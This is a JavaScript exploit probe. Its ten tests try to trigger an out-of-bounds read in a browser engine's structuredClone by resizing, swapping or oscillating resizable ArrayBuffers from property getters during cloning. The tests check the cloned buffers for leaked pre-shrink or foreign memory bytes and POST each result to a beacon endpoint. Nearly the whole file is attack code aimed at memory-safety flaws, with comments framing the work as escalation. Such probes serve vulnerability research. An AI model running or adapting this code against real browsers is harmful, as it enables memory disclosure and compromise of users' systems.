/* p69-toctou — Precision getter-race TOCTOU escalation
 * V68X T1 proved: getters fire during structuredClone, RAB resize works mid-clone.
 * V68X T2 proved: getter can detach buffer mid-clone (serializer catches it).
 *
 * This probe exploits the TOCTOU window:
 * - Serializer snapshots RAB size (e.g., 4096)
 * - Getter fires and SHRINKS the RAB (e.g., to 64)
 * - Serializer copies 4096 bytes from a 64-byte backing → OOB read
 *
 * Also tests: GC trigger in getter, property replacement, view confusion.
 * Beacon prefix: V69T-
 */
(function(){
"use strict";
var RUN_ID = "v69t" + Math.random().toString(36).slice(2,12);
var PREFIX = "V69T-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press69-TOCTOU getter-race escalation");

/* ====== T1: Shrink RAB in getter — size snapshot vs data copy mismatch ====== */
function test1() {
  var r = {};
  try {
    // Create large RAB, fill with pattern
    var rab = new ArrayBuffer(4096, { maxByteLength: 8192 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = i & 0xFF;

    var shrinkCount = 0;
    var obj = {};
    // Property 'a' is serialized first (alphabetical? or insertion order?)
    // We want the RAB to be read AFTER the getter shrinks it
    obj.buf = rab; // RAB in the object graph (not transfer list)

    Object.defineProperty(obj, 'trigger', { enumerable: true, get: function() {
      shrinkCount++;
      try { rab.resize(64); } catch(e) { r.shrinkErr = e.message.slice(0,40); }
      return "fired";
    }});

    // Structuredclone reads properties — if it reads 'buf' size before 'trigger'
    // fires, then copies buf data after shrink → OOB
    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.shrinks = shrinkCount;
      r.clonedBufLen = cloned.buf ? cloned.buf.byteLength : "none";
      // If clonedBufLen > 64 → data was copied from BEFORE the shrink = potential OOB
      // If clonedBufLen = 64 → serializer used post-shrink size = safe
      r.OOB_INDICATOR = cloned.buf && cloned.buf.byteLength > 64;
      if (cloned.buf) {
        var cv = new Uint8Array(cloned.buf);
        // Check if bytes beyond 64 contain our pattern (pre-shrink data)
        r.byte0 = cv[0];
        r.byte63 = cv[63];
        if (cv.length > 64) {
          r.byte64 = cv[64]; // Should be 64 if pre-shrink pattern
          r.byte100 = cv.length > 100 ? cv[100] : "N/A";
          r.byte1000 = cv.length > 1000 ? cv[1000] : "N/A";
        }
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
      r.shrinks = shrinkCount;
    }
    // Check RAB state
    try { r.rabLen = rab.byteLength; } catch(e) { r.rabLen = "ERR"; }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T1-SHRINK", r);
}

/* ====== T2: Shrink in getter + RAB in transfer list ====== */
function test2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 8192 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = (i * 7) & 0xFF;

    var obj = {};
    Object.defineProperty(obj, 'x', { enumerable: true, get: function() {
      try { rab.resize(32); } catch(e) {}
      return 1;
    }});

    try {
      var cloned = structuredClone(obj, { transfer: [rab] });
      r.cloneOK = true;
      r.gotX = cloned.x;
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
    try { r.rabLen = rab.byteLength; } catch(e) { r.rabLen = "DETACHED"; }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T2-SHRINK-XFER", r);
}

/* ====== T3: Property order manipulation — force buf read after getter ====== */
function test3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(2048, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 2048; i++) u8[i] = 0xBB;

    // Object with properties in specific order
    // structuredClone walks [[OwnPropertyKeys]] which returns:
    // 1. Integer indices ascending
    // 2. String keys in insertion order
    // 3. Symbol keys in insertion order
    // So we put the getter BEFORE buf in insertion order
    var obj = Object.create(null);
    Object.defineProperty(obj, 'aaa', { enumerable: true, get: function() {
      rab.resize(64);
      return "shrunk";
    }});
    obj.buf = rab;

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.clonedBufLen = cloned.buf ? cloned.buf.byteLength : "none";
      r.gotAAA = cloned.aaa;
      r.OOB = cloned.buf && cloned.buf.byteLength > 64;
      if (cloned.buf && cloned.buf.byteLength > 0) {
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.lastByte = cv[cv.length - 1];
        // Check for 0xBB pattern in the clone beyond byte 64
        if (cv.length > 64) {
          var oobCount = 0;
          for (var j = 64; j < cv.length; j++) {
            if (cv[j] === 0xBB) oobCount++;
          }
          r.oobBBcount = oobCount; // If >0 → pre-shrink data leaked
        }
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
    try { r.rabLen = rab.byteLength; } catch(e) { r.rabLen = "ERR"; }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T3-ORDER", r);
}

/* ====== T4: Reverse order — buf BEFORE getter ====== */
function test4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(2048, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 2048; i++) u8[i] = 0xCC;

    var obj = Object.create(null);
    obj.buf = rab; // buf first in insertion order
    Object.defineProperty(obj, 'zzz', { enumerable: true, get: function() {
      rab.resize(64);
      return "shrunk";
    }});

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.clonedBufLen = cloned.buf ? cloned.buf.byteLength : "none";
      r.gotZZZ = cloned.zzz;
      r.OOB = cloned.buf && cloned.buf.byteLength > 64;
      if (cloned.buf) {
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        if (cv.length > 64) {
          var oobCC = 0;
          for (var j = 64; j < cv.length; j++) if (cv[j] === 0xCC) oobCC++;
          r.oobCCcount = oobCC;
        }
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T4-REVERSE", r);
}

/* ====== T5: Multiple getters that progressively shrink ====== */
function test5() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 8192 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

    var obj = Object.create(null);
    var calls = [];
    Object.defineProperty(obj, 'a1', { enumerable: true, get: function() {
      calls.push('a1');
      rab.resize(2048);
      return 1;
    }});
    Object.defineProperty(obj, 'a2', { enumerable: true, get: function() {
      calls.push('a2');
      rab.resize(512);
      return 2;
    }});
    Object.defineProperty(obj, 'a3', { enumerable: true, get: function() {
      calls.push('a3');
      rab.resize(64);
      return 3;
    }});
    obj.data = rab;

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.calls = calls.join(",");
      r.clonedDataLen = cloned.data ? cloned.data.byteLength : "none";
      r.OOB = cloned.data && cloned.data.byteLength > 64;
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
      r.calls = calls.join(",");
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T5-PROGRESSIVE", r);
}

/* ====== T6: GC pressure in getter ====== */
function test6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(1024, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 1024; i++) u8[i] = 0xEE;

    var obj = Object.create(null);
    Object.defineProperty(obj, 'gc', { enumerable: true, get: function() {
      // Trigger GC by allocating and discarding many large objects
      var junk = [];
      for (var k = 0; k < 500; k++) {
        junk.push(new ArrayBuffer(65536)); // 500 * 64KB = 32MB churn
      }
      junk = null; // eligible for GC
      // Also shrink RAB
      rab.resize(32);
      return "gc+shrink";
    }});
    obj.data = rab;

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.clonedDataLen = cloned.data ? cloned.data.byteLength : "none";
      r.OOB = cloned.data && cloned.data.byteLength > 32;
      if (cloned.data) {
        var cv = new Uint8Array(cloned.data);
        r.byte0 = cv[0];
        r.lastByte = cv[cv.length - 1];
        // Check for non-0xEE bytes (GC overwrote freed memory?)
        if (cv.length > 32) {
          var foreign = 0;
          for (var j = 32; j < Math.min(cv.length, 200); j++) {
            if (cv[j] !== 0xEE && cv[j] !== 0) foreign++;
          }
          r.foreignBytes = foreign; // non-pattern, non-zero = info leak
        }
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T6-GC", r);
}

/* ====== T7: Getter replaces typed array with different length ====== */
function test7() {
  var r = {};
  try {
    var buf = new ArrayBuffer(256);
    var orig = new Uint8Array(buf);
    for (var i = 0; i < 256; i++) orig[i] = 0xFF;

    var obj = {};
    obj.arr = orig;
    Object.defineProperty(obj, 'swap', { enumerable: true, get: function() {
      // Replace arr with a much smaller array
      obj.arr = new Uint8Array(8);
      obj.arr[0] = 0x42;
      return "swapped";
    }});

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.clonedArrLen = cloned.arr ? cloned.arr.length || cloned.arr.byteLength : "none";
      r.clonedSwap = cloned.swap;
      // Did we get the 256-byte original or the 8-byte replacement?
      if (cloned.arr) {
        r.byte0 = cloned.arr[0];
        r.isOrig = cloned.arr.length === 256 && cloned.arr[0] === 0xFF;
        r.isSwap = cloned.arr.length === 8 && cloned.arr[0] === 0x42;
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T7-SWAP", r);
}

/* ====== T8: Nested object with RAB at depth — getter at root ====== */
function test8() {
  var r = {};
  try {
    var rab = new ArrayBuffer(2048, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 2048; i++) u8[i] = 0xAA;

    // Deep nesting: getter at root, RAB buried deep
    var deep = { level1: { level2: { level3: { data: rab } } } };
    Object.defineProperty(deep, 'trap', { enumerable: true, get: function() {
      rab.resize(64);
      return "trapped";
    }});

    try {
      var cloned = structuredClone(deep);
      r.cloneOK = true;
      var cd = cloned.level1 && cloned.level1.level2 && cloned.level1.level2.level3;
      r.clonedDataLen = cd && cd.data ? cd.data.byteLength : "none";
      r.gotTrap = cloned.trap;
      r.OOB = cd && cd.data && cd.data.byteLength > 64;
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T8-DEEP", r);
}

/* ====== T9: View on RAB — getter shrinks RAB below view's fixed offset ====== */
function test9() {
  var r = {};
  try {
    var rab = new ArrayBuffer(1024, { maxByteLength: 2048 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 1024; i++) u8[i] = i & 0xFF;

    // Create a view starting at offset 512, length 256
    var view = new Uint8Array(rab, 512, 256);
    r.viewLen = view.length; // 256
    r.viewOff = view.byteOffset; // 512
    r.viewVal0 = view[0]; // should be 0 (512 & 0xFF)

    var obj = Object.create(null);
    Object.defineProperty(obj, 'shrink', { enumerable: true, get: function() {
      // Shrink RAB to 128 — below the view's byteOffset of 512!
      rab.resize(128);
      return "shrunk";
    }});
    obj.view = view;

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.gotShrink = cloned.shrink;
      if (cloned.view) {
        r.clonedViewLen = cloned.view.length || cloned.view.byteLength;
        r.clonedViewOff = cloned.view.byteOffset;
        try { r.clonedView0 = cloned.view[0]; } catch(e) { r.clonedView0 = "ERR"; }
      } else {
        r.clonedView = "null";
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }

    // Check original view after shrink
    try {
      r.origViewLen = view.length;
      r.origView0 = view[0];
      r.ORIG_OOB = view.length > 0; // If RAB shrunk below offset, view should be 0-length
    } catch(e) { r.origViewErr = e.message.slice(0,40); }

  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T9-VIEW-UNDERCUT", r);
}

/* ====== T10: Rapid grow-shrink oscillation in getter ====== */
function test10() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 65536 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) u8[i] = 0x77;

    var oscillations = 0;
    var obj = Object.create(null);
    Object.defineProperty(obj, 'osc', { enumerable: true, get: function() {
      // Rapid grow/shrink to try to trigger realloc
      for (var k = 0; k < 20; k++) {
        rab.resize(65536); // grow to max
        rab.resize(64);    // shrink to tiny
        oscillations++;
      }
      rab.resize(64); // leave small
      return oscillations;
    }});
    obj.data = rab;

    try {
      var cloned = structuredClone(obj);
      r.cloneOK = true;
      r.oscillations = oscillations;
      r.clonedDataLen = cloned.data ? cloned.data.byteLength : "none";
      r.OOB = cloned.data && cloned.data.byteLength > 64;
      if (cloned.data) {
        var cv = new Uint8Array(cloned.data);
        // Check for stale/garbage data beyond 64
        if (cv.length > 64) {
          var nonzero = 0;
          for (var j = 64; j < Math.min(cv.length, 500); j++) {
            if (cv[j] !== 0) nonzero++;
          }
          r.nonzeroAfter64 = nonzero;
        }
      }
    } catch(e) {
      r.cloneOK = false;
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.fatal = e.message.slice(0,80); }
  B("T10-OSCILLATE", r);
}

/* ====== Run all ====== */
try {
  test1();
  setTimeout(test2, 150);
  setTimeout(test3, 300);
  setTimeout(test4, 450);
  setTimeout(test5, 600);
  setTimeout(test6, 800);
  setTimeout(test7, 1000);
  setTimeout(test8, 1200);
  setTimeout(test9, 1400);
  setTimeout(test10, 1600);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe69-done"); }, 16000);
})();
